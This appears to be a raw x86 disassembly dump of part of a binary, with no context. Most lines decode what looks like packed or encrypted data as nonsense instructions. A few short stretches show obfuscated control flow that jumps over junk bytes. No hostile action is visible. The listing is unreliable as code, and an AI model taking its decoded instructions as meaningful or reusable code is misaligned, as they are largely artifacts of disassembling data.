  40e20d:	push   ds
  40e20e:	lock dec ebp
  40e210:	mov    esp,0x3f94dc6a
  40e215:	or     eax,0xe61c0f58
  40e21a:	pop    ebx
  40e21b:	add    bh,cl
  40e21d:	inc    ebx
  40e21e:	jae    0x40e256
  40e220:	dec    ebx
  40e221:	ins    DWORD PTR es:[edi],dx
  40e222:	fidivr WORD PTR [ebx]
  40e224:	xchg   ebx,eax
  40e225:	mov    ds:0x45122295,eax
  40e22a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e22b:	mov    dl,0x6c
  40e22d:	call   FWORD PTR [edx-0x7d]
  40e230:	push   edi
  40e231:	outs   dx,BYTE PTR ds:[esi]
  40e232:	out    dx,eax
  40e233:	imul   ebp,edx,0xc91146a2
  40e239:	jb     0x40e249
  40e23b:	pop    esp
  40e23c:	mov    dh,0xf0
  40e23e:	cmc    
  40e23f:	cwde   
  40e240:	or     ebx,edi
  40e242:	ss in  al,0x62
  40e245:	(bad)  
  40e246:	ss mov ah,0xe9
  40e249:	and    al,0x2e
  40e24b:	fisubr DWORD PTR [edx-0x7a]
  40e24e:	popf   
  40e24f:	cmp    eax,0x82648b04
  40e254:	or     eax,0xde77cca0
  40e259:	out    dx,al
  40e25a:	jae    0x40e2b5
  40e25c:	dec    ecx
  40e25d:	fwait
  40e25e:	inc    esp
  40e25f:	ds hlt 
  40e261:	test   esi,ebp
  40e263:	std    
  40e264:	ds mov bl,0x86
  40e267:	cdq    
  40e268:	cli    
  40e269:	addr16 jmp 0x40e237
  40e26c:	adc    edx,ebp
  40e26e:	jge    0x40e2d1
  40e270:	sub    eax,0xcf5413ec
  40e275:	test   eax,0xdbf2b2ce
  40e27a:	aam    0xbb
  40e27c:	cmp    eax,0xd7ceea31
  40e281:	into   
  40e282:	call   0x87052f9c
  40e287:	add    BYTE PTR [edx-0x3b],0xc1
  40e28b:	or     al,0x77
  40e28d:	es scas eax,DWORD PTR es:[edi]
  40e28f:	outs   dx,DWORD PTR ds:[esi]
  40e290:	outs   dx,DWORD PTR ds:[esi]
  40e291:	shl    DWORD PTR [ebx],1
  40e293:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e294:	jb     0x40e29b
  40e296:	icebp  
  40e297:	scas   al,BYTE PTR es:[edi]
  40e298:	mov    ecx,0x1a5120bd
  40e29d:	adc    ch,BYTE PTR [esi]
  40e29f:	jb     0x40e2a3
  40e2a1:	shr    ah,1
  40e2a3:	mov    ch,0x8f
  40e2a5:	mov    eax,ds:0xfa803b0b
  40e2aa:	call   0x8596:0xfb4c91d6
  40e2b1:	(bad)  
  40e2b3:	pop    esp
  40e2b4:	in     al,dx
  40e2b5:	retf   
  40e2b6:	aaa    
  40e2b7:	inc    esp
  40e2b8:	cwde   
  40e2b9:	out    dx,al
  40e2ba:	xor    DWORD PTR [esi],ebp
  40e2bc:	mov    dh,0x96
  40e2bf:	inc    ebx
  40e2c0:	jg     0x40e280
  40e2c2:	jle    0x40e343
  40e2c4:	loope  0x40e2c7
  40e2c6:	push   ds
  40e2c7:	out    dx,eax
  40e2c8:	retf   
  40e2c9:	popa   
  40e2ca:	fs mov bh,0xa4
  40e2cd:	aam    0xa4
  40e2cf:	adc    eax,0x1c53e458
  40e2d4:	mov    al,ds:0x64d9449a
  40e2d9:	add    ebx,DWORD PTR [ecx-0x4b]
  40e2dc:	or     esi,eax
  40e2de:	out    dx,eax
  40e2df:	nop
  40e2e0:	rcl    BYTE PTR [ecx+0x640dac2f],cl
  40e2e6:	pop    edi
  40e2e7:	push   es
  40e2e8:	test   DWORD PTR [ebx+0x78],edi
  40e2eb:	shl    DWORD PTR [esi-0x1eca59cf],0x0
  40e2f2:	out    0xc2,al
  40e2f4:	mov    dl,BYTE PTR [edx*1-0x5198875]
  40e2fb:	ss adc al,0xae
  40e2fe:	sub    BYTE PTR [eax-0x413e15e7],al
  40e304:	adc    DWORD PTR fs:[ecx-0xd],ecx
  40e308:	or     BYTE PTR ds:0xc9c48044,dh
  40e30e:	jge    0x40e2b4
  40e310:	and    al,0xb9
  40e312:	inc    edx
  40e313:	scas   eax,DWORD PTR es:[edi]
  40e314:	into   
  40e315:	or     bl,BYTE PTR ds:[ecx-0x75c18109]
  40e31c:	add    DWORD PTR [edx-0x6b],esp
  40e31f:	test   DWORD PTR [ebx-0x9703e3c],edi
  40e325:	cld    
  40e326:	pop    ss
  40e327:	push   ss
  40e328:	rol    DWORD PTR [edx+ebp*2],1
  40e32b:	cmp    dl,BYTE PTR ds:0x730a9e72
  40e331:	push   0x67
  40e333:	jae    0x40e3a6
  40e335:	and    ch,bl
  40e337:	mov    dh,0xd7
  40e339:	mov    cl,0xf9
  40e33b:	and    eax,ecx
  40e33d:	adc    esi,ebp
  40e33f:	push   ecx
  40e340:	inc    ecx
  40e341:	dec    eax
  40e342:	inc    ecx
  40e343:	lods   al,BYTE PTR ds:[esi]
  40e344:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e345:	dec    edx
  40e346:	adc    al,0x28
  40e348:	std    
  40e349:	pop    esi
  40e34a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e34b:	sar    bl,cl
  40e34d:	dec    ebx
  40e34e:	adc    DWORD PTR [ebx+0x7d2c0393],ebp
  40e354:	adc    ebp,edi
  40e356:	inc    edx
  40e357:	pop    edi
  40e358:	lea    esp,[edi]
  40e35a:	bound  ebx,QWORD PTR [ebx]
  40e35c:	cmp    esi,DWORD PTR [ebx]
  40e35e:	sbb    eax,0x4a7f5eac
  40e363:	(bad)  
  40e365:	mov    ebp,ss
  40e367:	fild   DWORD PTR [edx+0x42af62cd]
  40e36d:	dec    ecx
  40e36e:	addr16 loope 0x40e3c5
  40e371:	ss xchg ebx,eax
  40e373:	push   es
  40e374:	pop    ss
  40e375:	or     eax,0x536a6c8d
  40e37a:	ror    DWORD PTR [edi],0xad
  40e37d:	jecxz  0x40e38c
  40e37f:	cmp    cl,BYTE PTR [ecx+0x5679c3ee]
  40e385:	in     eax,0xb2
  40e387:	push   esi
  40e388:	int    0x69
  40e38a:	cmp    DWORD PTR [ecx+0x53c6520b],0x6620ab43
  40e394:	dec    ebp
  40e395:	mov    ch,0xe
  40e397:	pushf  
  40e398:	push   cs
  40e399:	pop    ds
  40e39a:	fidiv  DWORD PTR gs:[edi+0x5e050848]
  40e3a1:	or     eax,0x1d09adf9
  40e3a6:	nop
  40e3a7:	lods   eax,DWORD PTR ds:[esi]
  40e3a8:	push   ebp
  40e3a9:	js     0x40e363
  40e3ab:	cmp    esi,DWORD PTR [edi-0x34]
  40e3ae:	pop    ds
  40e3af:	retf   
  40e3b0:	or     edi,DWORD PTR [eax]
  40e3b2:	sbb    dl,BYTE PTR ds:0x5eb34bf6
  40e3b8:	enter  0x79a7,0x35
  40e3bc:	loope  0x40e374
  40e3be:	push   esi
  40e3bf:	and    ch,BYTE PTR ss:[eax]
  40e3c2:	cdq    
  40e3c3:	sub    esp,esi
  40e3c5:	(bad)  
  40e3c6:	das    
  40e3c7:	je     0x40e442
  40e3c9:	dec    esi
  40e3ca:	xor    DWORD PTR [ebx+0x4c198ec0],ebp
  40e3d0:	cdq    
  40e3d1:	hlt    
  40e3d2:	jl     0x40e421
  40e3d4:	cmp    edx,DWORD PTR [edi+0x2bdc7275]
  40e3da:	xchg   BYTE PTR [eax],dh
  40e3dc:	aad    0x68
  40e3de:	xchg   esp,eax
  40e3df:	cmp    DWORD PTR [edx-0x32b39dea],0x2938f24f
  40e3e9:	xchg   esi,eax
  40e3ea:	pop    eax
  40e3eb:	das    
  40e3ec:	loope  0x40e434
  40e3ee:	fsub   DWORD PTR [ebp+0x43]
  40e3f1:	mov    esp,0xbbdb2398
  40e3f6:	lds    esi,FWORD PTR [eax-0x5d]
  40e3f9:	mov    cs,WORD PTR [edx-0x40]
  40e3fc:	leave  
  40e3fd:	sub    DWORD PTR [edx-0x222e1a32],edi
  40e403:	xchg   edi,eax
  40e404:	pop    ss
  40e405:	outs   dx,DWORD PTR ds:[esi]
  40e406:	pop    ebp
  40e407:	jae    0x40e3e3
  40e409:	in     al,dx
  40e40a:	mov    edi,0x3120c096
  40e40f:	into   
  40e410:	sbb    esi,DWORD PTR [ecx-0x2f]
  40e413:	imul   ecx,DWORD PTR [ecx-0x7c],0x75
  40e417:	pop    ebx
  40e418:	out    0x85,eax
  40e41a:	lods   eax,DWORD PTR ds:[esi]
  40e41b:	push   0xdbb71e59
  40e420:	mov    esi,ecx
  40e422:	sbb    eax,0xaae8397
  40e427:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e428:	stos   BYTE PTR es:[edi],al
  40e429:	cmp    BYTE PTR ds:0x8414b2a6,dh
  40e42f:	scas   al,BYTE PTR es:[edi]
  40e430:	xchg   ecx,eax
  40e431:	sub    ebx,DWORD PTR [eax+0x6d3b6d27]
  40e437:	bnd jmp 0x40e496
  40e43a:	(bad)  
  40e43c:	mov    ds:0xac009606,eax
  40e441:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e442:	fwait
  40e443:	ds repz pop esp
  40e446:	mov    ebp,0x3780ae01
  40e44b:	xor    edx,edx
  40e44d:	and    eax,0x6d33
  40e452:	lea    ecx,[ecx+eax*1-0x6520]
  40e459:	mov    eax,DWORD PTR [ebp+0x8]
  40e45c:	mov    ebx,DWORD PTR [ebp-0x4]
  40e45f:	add    eax,edi
  40e461:	div    ebx
  40e463:	mov    edx,DWORD PTR [ebp-0x8]
  40e466:	mov    ebx,0x940a7
  40e46b:	sub    eax,edx
  40e46d:	xor    edx,edx
  40e46f:	div    ebx
  40e471:	add    eax,esi
  40e473:	cmp    ecx,eax
  40e475:	jb     0x40db77
  40e47b:	xor    ebx,ebx
  40e47d:	inc    ebx
  40e47e:	mov    DWORD PTR [ebp+0xc],0x77bd
  40e485:	mov    DWORD PTR [ebp+0x8],0x4f2a
  40e48c:	mov    DWORD PTR [ebp-0x8],0x4738
  40e493:	mov    DWORD PTR [ebp-0xc],0x6c4e
  40e49a:	mov    DWORD PTR [ebp-0x10],0x7f0d
  40e4a1:	mov    DWORD PTR [ebp-0x14],0x64ec
  40e4a8:	mov    DWORD PTR [ebp-0x18],0x1984
  40e4af:	mov    DWORD PTR [ebp-0x1c],0x293
  40e4b6:	mov    eax,DWORD PTR [ebp+0x8]
  40e4b9:	mov    ecx,DWORD PTR [ebp+0xc]
  40e4bc:	add    eax,0x1ef2
  40e4c1:	and    eax,ecx
  40e4c3:	xor    eax,0x7240
  40e4c8:	mov    ecx,0x7aaa
  40e4cd:	jmp    0x40e791
  40e4d2:	mov    eax,0x5a62ef3c
  40e4d7:	and    bl,BYTE PTR [edx+edi*1]
  40e4da:	ss dec esi
  40e4dc:	xor    DWORD PTR [eax+0x7cc53337],0x1818c289
  40e4e6:	rcl    BYTE PTR [eax+ebx*1],cl
  40e4e9:	sbb    BYTE PTR [edi+0x73],al
  40e4ec:	mov    edx,0xd9c834e0
  40e4f1:	aas    
  40e4f2:	hlt    
  40e4f3:	leave  
  40e4f4:	push   eax
  40e4f5:	adc    ebp,DWORD PTR [esi]
  40e4f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4f8:	test   BYTE PTR [esi+ebp*1+0x69028e47],0x1a
  40e500:	aaa    
  40e501:	(bad)  
  40e502:	fist   WORD PTR [ecx+0x5a]
  40e505:	in     eax,0x49
  40e507:	pop    ebp
  40e508:	daa    
  40e509:	mov    ch,BYTE PTR [ebp+0x1f30788]
  40e50f:	sbb    eax,0xb9c96300
  40e514:	jae    0x40e55e
  40e516:	pop    ebx
  40e517:	retf   0x5f22
  40e51a:	outs   dx,BYTE PTR ds:[esi]
  40e51b:	mov    ebx,DWORD PTR [ecx-0x72c906fc]
  40e521:	(bad)
  40e524:	(bad)  
  40e525:	mov    eax,ds:0x82e5faec
  40e52a:	arpl   WORD PTR [edi],di
  40e52c:	retf   0xb50
  40e52f:	fbld   TBYTE PTR [ecx+ebp*2+0x707b25f9]
  40e536:	(bad)  
  40e537:	cld    
  40e538:	add    DWORD PTR [edi+0x10],ebx
  40e53b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e53c:	inc    esi
  40e53d:	push   ds
  40e53e:	cmp    DWORD PTR [edi+0x60f848bd],0xc71caf04
  40e548:	(bad)  
  40e549:	push   esi
  40e54a:	mov    DWORD PTR [esi+eiz*4-0x37],eax
  40e54e:	in     eax,0x69
  40e550:	sahf   
  40e551:	fcomip st,st(6)
  40e553:	arpl   si,bp
  40e555:	repnz inc ebp
  40e557:	add    dl,cl
  40e559:	add    ch,al
  40e55b:	jae    0x40e59c
  40e55d:	sbb    eax,0x1de5b32a
  40e562:	rcr    DWORD PTR [ecx-0x4c5bf61f],0x0
  40e569:	enter  0x6a27,0x6b
  40e56d:	stos   DWORD PTR es:[edi],eax
  40e56e:	(bad)  
  40e56f:	cmp    DWORD PTR [esi],edx
  40e571:	stos   BYTE PTR es:[edi],al
  40e572:	stc    
  40e573:	popa   
  40e574:	jle    0x40e58b
  40e576:	in     eax,0xa1
  40e578:	mov    esp,0x100eef1a
  40e57d:	retf   0x7d06
  40e580:	imul   edi,DWORD PTR [esi],0x49
  40e583:	push   cs
  40e584:	dec    esp
  40e585:	mov    ecx,0x62b256a4
  40e58a:	mov    BYTE PTR [eax+0x7],ah
  40e58d:	idiv   BYTE PTR [ecx+0x55]
  40e590:	dec    edi
  40e591:	cld    
  40e592:	outs   dx,DWORD PTR ds:[esi]
  40e593:	dec    esp
  40e594:	leave  
  40e595:	dec    ecx
  40e596:	das    
  40e597:	in     al,0xc7
  40e599:	dec    edi
  40e59a:	(bad)  
  40e59c:	cli    
  40e59d:	inc    esp
  40e59e:	icebp  
  40e59f:	fs push ds
  40e5a1:	sub    BYTE PTR [ecx-0x50a56f08],bh
  40e5a7:	dec    ebp
  40e5a8:	fild   DWORD PTR ds:0x9b238f0
  40e5ae:	fmul   st(3),st
  40e5b0:	push   edi
  40e5b1:	test   eax,0x7ec5ec93
  40e5b6:	adc    BYTE PTR [ebx-0x74],0xc7
  40e5ba:	dec    esp
  40e5bb:	dec    ebx
  40e5bc:	or     DWORD PTR [ebx-0x58],esp
  40e5bf:	pop    es
  40e5c0:	mov    edi,0x28beffc5
  40e5c5:	or     al,0xc
  40e5c7:	popa   
  40e5c8:	out    dx,al
  40e5c9:	ret    0xef13
  40e5cc:	std    
  40e5cd:	loope  0x40e5ac
  40e5cf:	mov    al,ds:0x99141cb0
  40e5d4:	jbe    0x40e575
  40e5d6:	mov    cl,0xd7
  40e5d8:	xchg   esp,eax
  40e5d9:	jle    0x40e580
  40e5db:	jae    0x40e652
  40e5dd:	loope  0x40e598
  40e5df:	or     cl,BYTE PTR [ecx+edi*1-0x7e]
  40e5e3:	cmp    dh,ah
  40e5e5:	pop    esi
  40e5e6:	popf   
  40e5e7:	push   ss
  40e5e8:	mov    bl,0x6f
  40e5ea:	rcl    BYTE PTR [eax],0x1e
  40e5ed:	xchg   ebx,eax
  40e5ee:	inc    edx
  40e5ef:	mov    al,ds:0x4e760841
  40e5f4:	push   cs
  40e5f5:	sub    eax,0xded18749
  40e5fa:	and    al,0x9a
  40e5fc:	out    0x52,al
  40e5fe:	aad    0xc
  40e600:	mov    dl,0xf3
  40e602:	sub    al,0xf6
  40e604:	or     BYTE PTR [ecx+0x53],ch
  40e607:	fwait
  40e608:	loopne 0x40e654
  40e60a:	xchg   BYTE PTR [ebp+0x5c],ch
  40e60d:	fcom   DWORD PTR [edx-0x6c020a06]
  40e613:	jno    0x40e5d5
  40e615:	out    0xd5,eax
  40e617:	xor    ebp,edi
  40e619:	adc    DWORD PTR [edi],edx
  40e61b:	pop    ebx
  40e61c:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e61e:	test   al,0x98
  40e620:	xor    esi,DWORD PTR [edx+0x2b]
  40e623:	mov    al,ds:0x265b9e44
  40e628:	daa    
  40e629:	mov    DWORD PTR [esi],esi
  40e62b:	pop    es
  40e62c:	jb     0x40e5d2
  40e62e:	sbb    al,dh
  40e630:	cli    
  40e631:	call   0x751d4b21
  40e636:	add    BYTE PTR [ebp+0x6863acd7],0x5b
  40e63d:	repnz xor ecx,DWORD PTR [edx+0x59]
  40e641:	fsub   st(0),st
  40e643:	push   cs
  40e644:	xchg   DWORD PTR [esi-0xb],ebx
  40e647:	push   esi
  40e648:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e649:	cli    
  40e64a:	add    BYTE PTR [edx+esi*4+0x6a],al
  40e64e:	adc    eax,0xf178a6eb
  40e653:	out    0xf5,al
  40e655:	or     DWORD PTR [esi-0x37],edx
  40e658:	xchg   ebx,eax
  40e659:	sub    eax,0xc4f23ad3
  40e65e:	(bad)  
  40e65f:	cmp    esi,DWORD PTR [edi-0x7a]
  40e662:	or     DWORD PTR [ebp-0xa],0x56
  40e666:	fld    QWORD PTR [ebx-0x7ef9a146]
  40e66c:	sbb    al,0x64
  40e66e:	or     al,BYTE PTR [ebx+0x17705c13]
  40e674:	pop    edi
  40e675:	add    ebp,DWORD PTR [ecx+ebp*4]
  40e678:	jae    0x40e61c
  40e67a:	dec    eax
  40e67b:	xchg   ah,dh
  40e67d:	inc    ecx
  40e67e:	pop    ss
  40e67f:	push   edx
  40e680:	retf   0x9b5b
  40e683:	xor    edx,DWORD PTR [esi+ecx*1-0x64baa188]
  40e68a:	push   es
  40e68b:	call   0x81271e03
  40e690:	or     DWORD PTR [edx+0x36cb8970],ebp
  40e696:	ja     0x40e69a
  40e698:	cli    
  40e699:	sub    bh,dh
  40e69b:	pop    ss
  40e69c:	stos   DWORD PTR es:[edi],eax
  40e69d:	es inc esi
  40e69f:	int3   
  40e6a0:	jns    0x40e63f
  40e6a2:	or     BYTE PTR [edx+0x75],ch
  40e6a5:	jno    0x40e687
  40e6a7:	xchg   edi,eax
  40e6a8:	mov    DWORD PTR [esi],edx
  40e6aa:	aad    0x4b
  40e6ac:	or     eax,0xd73f2b8
  40e6b1:	jno    0x40e634
  40e6b3:	fsub   QWORD PTR [ebx+0x26f765a3]
  40e6b9:	fidivr WORD PTR [edx+0x32]
  40e6bc:	sub    ah,bl
  40e6be:	pop    ss
  40e6bf:	sbb    DWORD PTR ds:0xc8f65fd8,edi
  40e6c5:	adc    ebx,DWORD PTR ds:0x1500ce86
  40e6cb:	pop    eax
  40e6cc:	dec    edi
  40e6cd:	cmc    
  40e6ce:	or     al,0xe9
  40e6d0:	(bad)  
  40e6d1:	aas    
  40e6d2:	xor    bh,ah
  40e6d4:	or     ebp,edi
  40e6d6:	sub    eax,0x8b73bfcf
  40e6db:	dec    esi
  40e6dc:	dec    ebp
  40e6dd:	cwde   
  40e6de:	push   eax
  40e6df:	cmovbe ecx,DWORD PTR [ecx+0x59]
  40e6e3:	push   0x76
  40e6e5:	(bad)  
  40e6e7:	push   ss
  40e6e8:	jg     0x40e6df
  40e6ea:	leave  
  40e6eb:	jmp    0x5c3fa3fd
  40e6f0:	sub    eax,0xc43cac7f
  40e6f5:	and    bh,BYTE PTR [ecx+esi*8]
  40e6f8:	pop    es
  40e6f9:	imul   ebp,DWORD PTR [ebx],0x456fcbb7
  40e6ff:	xchg   esi,eax
  40e700:	mul    BYTE PTR [ebp+0x4f8b7bb5]
  40e706:	ds data16 int3 
  40e709:	ret    0x59e8
  40e70c:	and    al,0xf6
  40e70e:	ffree  st(1)
  40e710:	std    
  40e711:	sbb    ebp,DWORD PTR [esi+0x76]
  40e714:	xchg   edx,eax
  40e715:	loope  0x40e724
  40e717:	mul    esi
  40e719:	xchg   DWORD PTR [ecx],edx
  40e71b:	sub    eax,0xaaf2b807
  40e720:	push   0x65
  40e722:	push   dx
  40e724:	xchg   ebx,eax
  40e725:	cmp    dh,ah
  40e727:	gs es cdq 
  40e72a:	cmp    ebp,DWORD PTR [ecx+0x5edadf17]
  40e730:	add    DWORD PTR [ebp-0x48b36e8],eax
  40e736:	arpl   dx,di
  40e738:	mov    al,0xe8
  40e73a:	mov    cl,0x23
  40e73c:	mov    ebx,0x3341004b
  40e741:	xchg   esi,eax
  40e742:	push   ss
  40e743:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e744:	inc    ecx
  40e745:	jge    0x40e797
  40e747:	sub    BYTE PTR [esi],dl
  40e749:	pop    esp
  40e74a:	iret   
  40e74b:	cmp    DWORD PTR ds:0x5a803317,edi
  40e751:	mov    edi,0xc96b659d
  40e756:	adc    al,bl
  40e758:	data16 xchg BYTE PTR [edi-0x678120d1],dh
  40e75f:	loope  0x40e6fc
  40e761:	cmp    eax,0xc8ff1f95
  40e766:	out    dx,al
  40e767:	add    al,0x1c
  40e769:	fisubr DWORD PTR [eax-0x79]
  40e76c:	into   
  40e76d:	das    
  40e76e:	aas    
  40e76f:	mov    DWORD PTR ds:0x80bda84f,esi
  40e775:	jg     0x40e7e3
  40e777:	pop    edx
  40e778:	aad    0xb4
  40e77a:	jmp    0xe8b3:0xf79e22fe
  40e781:	add    eax,0xf7994333
  40e786:	inc    ebx
  40e787:	popf   
  40e788:	xchg   ecx,eax
  40e789:	adc    ebx,DWORD PTR [ebx+0x6c27df5]
  40e78f:	jecxz  0x40e74d
  40e791:	sub    ecx,eax
  40e793:	mov    DWORD PTR [ebp+0xc],0x8d3
  40e79a:	mov    DWORD PTR [ebp+0x8],0x2392
  40e7a1:	mov    DWORD PTR [ebp-0x20],ebx
  40e7a4:	mov    DWORD PTR [ebp-0x24],0x338f
  40e7ab:	mov    DWORD PTR [ebp-0x28],0x61c9
  40e7b2:	mov    eax,DWORD PTR [ebp+0x8]
  40e7b5:	mov    edx,DWORD PTR [ebp+0xc]
  40e7b8:	imul   eax,edx
  40e7bb:	xor    eax,0x40a0
  40e7c0:	or     eax,0x1a48
  40e7c5:	xor    eax,0x139ddb0
  40e7ca:	mov    esi,ecx
  40e7cc:	sub    esi,eax
  40e7ce:	mov    eax,DWORD PTR [ebp-0x28]
  40e7d1:	mov    edx,DWORD PTR [ebp-0x24]
  40e7d4:	mov    edi,DWORD PTR [ebp-0x20]
  40e7d7:	or     eax,0x1cc2
  40e7dc:	sub    eax,edx
  40e7de:	jmp    0x40eaa2
  40e7e3:	or     BYTE PTR [esp+ebx*1-0xd],0x1c
  40e7e8:	loop   0x40e828
  40e7ea:	sbb    bh,BYTE PTR [esi]
  40e7ec:	call   DWORD PTR [ebx-0x56]
  40e7ef:	xchg   edx,eax
  40e7f0:	stos   BYTE PTR es:[edi],al
  40e7f1:	adc    ch,BYTE PTR [edx+0x1818be42]
  40e7f7:	rcl    BYTE PTR [eax+ebx*1],cl
  40e7fa:	sbb    al,bl
  40e7fc:	xchg   edi,eax
  40e7fd:	or     BYTE PTR [ecx],ch
  40e7ff:	nop
  40e800:	iret   
  40e801:	test   DWORD PTR [eax-0x3b],0x22874e2c
  40e808:	aas    
  40e809:	xchg   esi,eax
  40e80a:	cmp    al,0xef
  40e80c:	ror    ecx,cl
  40e80e:	out    dx,al
  40e80f:	xchg   DWORD PTR [ebx],eax
  40e811:	fbld   TBYTE PTR [eax+edx*1+0xb2f723c]
  40e818:	push   cs
  40e819:	shr    cl,0xa3
  40e81c:	push   esi
  40e81d:	js     0x40e868
  40e81f:	pop    edx
  40e820:	xor    al,0x62
  40e822:	xchg   BYTE PTR [edx+edi*8-0x2364283a],dl
  40e829:	adc    al,0x7
  40e82b:	mov    cl,0xec
  40e82d:	lods   al,BYTE PTR ds:[esi]
  40e82e:	les    edi,FWORD PTR [ebp-0x6b]
  40e831:	mov    ch,BYTE PTR ds:0xef73120b
  40e837:	dec    ebp
  40e838:	jae    0x40e88c
  40e83a:	mov    ds:0xe81ec8b4,eax
  40e83f:	les    ebx,FWORD PTR [edi-0x6f35d42c]
  40e845:	mov    eax,DWORD PTR [ecx+0xf]
  40e848:	pop    edi
  40e849:	adc    eax,0x6a1cc300
  40e84e:	icebp  
  40e84f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e850:	xchg   ebx,eax
  40e851:	pop    edx
  40e852:	mov    ch,0xde
  40e854:	in     al,0xc9
  40e856:	scas   eax,DWORD PTR es:[edi]
  40e857:	mov    WORD PTR [esi+0x1f5591f9],es
  40e85d:	neg    edx
  40e85f:	xchg   esp,eax
  40e860:	and    BYTE PTR [eax],ch
  40e862:	jae    0x40e856
  40e864:	ja     0x40e85d
  40e866:	jne    0x40e869
  40e868:	xor    ecx,ecx
  40e86a:	push   ecx
  40e86b:	jae    0x40e8a6
  40e86d:	mov    al,ds:0xa112712b
  40e872:	xor    al,0x8c
  40e874:	xchg   DWORD PTR [ecx+0x28],edi
  40e877:	les    ecx,FWORD PTR [esi+0x74]
  40e87a:	jne    0x40e82e
  40e87c:	mov    esp,0x8b241da4
  40e881:	mov    ch,0xcc
  40e883:	sbb    eax,0xd080a428
  40e888:	in     eax,dx
  40e889:	jle    0x40e82c
  40e88b:	out    dx,eax
  40e88c:	add    eax,0x2f250374
  40e891:	repnz fidiv WORD PTR [edx]
  40e894:	mov    eax,ds:0x9b187dd
  40e899:	loope  0x40e8db
  40e89b:	push   esi
  40e89c:	les    ecx,FWORD PTR [ebp-0x340a23a0]
  40e8a2:	out    dx,al
  40e8a3:	mov    DWORD PTR [edx+0x4207b341],edx
  40e8a9:	test   eax,0xb0018dfb
  40e8ae:	out    0x48,al
  40e8b0:	dec    esi
  40e8b1:	bound  esp,QWORD PTR [eax]
  40e8b3:	cmp    DWORD PTR [edx+eax*2],esp
  40e8b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8b7:	call   0x5664:0x82cc3d8b
  40e8be:	out    dx,al
  40e8bf:	xchg   BYTE PTR [esi+0x1ee2da7b],ch
  40e8c5:	aaa    
  40e8c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8c7:	out    dx,eax
  40e8c8:	stos   BYTE PTR es:[edi],al
  40e8c9:	call   0x5e54:0x4c81e4ef
  40e8d0:	imul   esp,DWORD PTR [eax-0x4a],0xffffffe3
  40e8d4:	mov    ds:0xb27ff206,al
  40e8d9:	add    eax,0x88ad407b
  40e8de:	pop    esp
  40e8df:	int3   
  40e8e0:	xor    BYTE PTR [esi-0x27247860],bh
  40e8e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8e7:	xchg   ebx,eax
  40e8e8:	or     al,0x8d
  40e8ea:	xchg   ecx,eax
  40e8eb:	test   DWORD PTR [ebx],ecx
  40e8ed:	mov    ?,WORD PTR [eax]
  40e8ef:	frstor [esi]
  40e8f1:	sbb    BYTE PTR [ebx+edx*8],al
  40e8f4:	mov    eax,0xc934bdbd
  40e8f9:	sahf   
  40e8fa:	scas   eax,DWORD PTR es:[edi]
  40e8fb:	fimul  DWORD PTR [eax]
  40e8fd:	pop    es
  40e8fe:	sbb    al,0x49
  40e900:	shr    esi,1
  40e902:	imul   esp,DWORD PTR [ebx],0xffffffaa
  40e905:	out    dx,eax
  40e906:	adc    ecx,DWORD PTR [ebx-0x1b16e788]
  40e90c:	dec    eax
  40e90d:	nop
  40e90e:	stos   DWORD PTR es:[edi],eax
  40e90f:	adc    eax,0x2ce2b66c
  40e914:	jbe    0x40e8fc
  40e916:	sahf   
  40e917:	jnp    0x40e942
  40e919:	mov    ebp,0x9613d985
  40e91e:	leave  
  40e91f:	rcr    DWORD PTR es:[ecx],0xbd
  40e923:	out    0x46,eax
  40e925:	inc    esi
  40e926:	jle    0x40e8bd
  40e928:	add    dl,BYTE PTR [eax]
  40e92a:	packsswb mm2,QWORD PTR [edi]
  40e92d:	dec    esp
  40e92e:	inc    eax
  40e92f:	js     0x40e9b0
  40e931:	add    bl,BYTE PTR [edi-0x5c]
  40e934:	inc    esp
  40e935:	aas    
  40e936:	adc    al,0xda
  40e938:	sub    al,0x73
  40e93a:	lods   al,BYTE PTR ds:[esi]
  40e93b:	in     eax,dx
  40e93c:	adc    al,BYTE PTR [ecx-0x30d1dd51]
  40e942:	shl    BYTE PTR [ebx-0x53],0x66
  40e946:	lods   eax,DWORD PTR ds:[esi]
  40e947:	mov    eax,ds:0x7494029e
  40e94c:	icebp  
  40e94d:	adc    ch,BYTE PTR [edi+0x49]
  40e950:	sbb    al,0xee
  40e952:	in     eax,dx
  40e953:	aas    
  40e954:	and    eax,0xc24dacb4
  40e959:	jp     0x40e99f
  40e95b:	daa    
  40e95c:	xchg   ebx,eax
  40e95d:	ret    0xb5b
  40e960:	pop    edi
  40e961:	div    DWORD PTR [eax]
  40e963:	jmp    0xbb19:0x526aaba
  40e96a:	cmp    DWORD PTR [edx],0x54aa6f26
  40e970:	test   eax,0xab62998e
  40e975:	jl     0x40e9de
  40e977:	xchg   ebx,eax
  40e978:	xchg   esi,eax
  40e979:	retf   
  40e97a:	repnz xchg ebp,eax
  40e97c:	(bad)  
  40e97d:	not    DWORD PTR [ebp+0x25d17358]
  40e983:	call   0xd482:0x592545ff
  40e98a:	idiv   DWORD PTR [edi-0x57]
  40e98d:	add    ecx,edx
  40e98f:	xchg   ebp,eax
  40e990:	jg     0x40e931
  40e992:	mov    ch,0xb7
  40e994:	jbe    0x40e949
  40e996:	sub    ebx,DWORD PTR [ebx+0x4dfea35e]
  40e99c:	shr    BYTE PTR ds:0xde52ceca,0xad
  40e9a3:	sahf   
  40e9a4:	scas   al,BYTE PTR es:[edi]
  40e9a5:	push   0x9e2aadb1
  40e9aa:	sub    al,0x79
  40e9ac:	sbb    eax,0x71a4f07a
  40e9b1:	fldenv [esi-0x2e]
  40e9b4:	out    dx,al
  40e9b5:	loop   0x40ea0f
  40e9b7:	dec    edi
